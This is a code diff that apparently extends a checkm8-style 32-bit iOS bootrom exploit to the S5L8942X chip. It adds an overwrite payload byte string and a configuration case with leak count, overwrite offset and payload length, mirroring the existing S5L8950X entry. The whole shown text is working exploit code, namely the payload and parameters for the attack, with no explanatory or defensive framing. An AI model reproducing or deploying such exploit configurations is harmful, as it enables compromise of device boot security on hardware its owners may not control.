@@ -85,12 +85,19 @@ static int send_data(irecv_client_t client, unsigned char* data, size_t size){
 
 
 // payload
+#define S5l8942X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
 #define S5l8950X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
 #define S5l8955X_OVERWRITE S5l8950X_OVERWRITE
 #define S5l8960X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x80\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 
 static int get_exploit_configuration(uint16_t cpid, checkm8_32_t* config) {
     switch(cpid) {
+        case 0x8942:
+            config->large_leak = 659;
+            config->overwrite_offset = 0x640;
+            config->overwrite = S5l8942X_OVERWRITE;
+            config->overwrite_len = 28;
+            return 0;
         case 0x8950:
             config->large_leak = 659;
             config->overwrite_offset = 0x640;
